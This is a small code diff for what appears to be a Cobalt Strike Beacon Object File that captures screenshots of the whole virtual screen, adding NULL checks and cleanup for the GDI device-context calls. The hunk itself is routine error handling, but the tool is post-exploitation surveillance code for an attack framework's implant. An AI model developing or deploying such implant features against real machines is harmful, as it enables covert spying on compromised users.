@@ -728,7 +728,17 @@ void go(char* buff, int len)
         int w = pGetSystemMetrics(SM_CXVIRTUALSCREEN);
         int h = pGetSystemMetrics(SM_CYVIRTUALSCREEN);
         HDC hScreen = pGetDC(NULL);
+        if (hScreen == NULL) {
+            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pGetDC(NULL) returned NULL. Last error: %lu", GetLastError());
+            return;  // Depending on your flow, consider exiting or additional error handling
+        }
+        
         HDC hDC = pCreateCompatibleDC(hScreen);
+        if (hDC == NULL) {
+            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pCreateCompatibleDC failed. Last error: %lu", GetLastError());
+            pReleaseDC(NULL, hScreen);  // Clean up the obtained screen DC before returning
+            return;
+        }
         hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
         if (!hBitmap) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
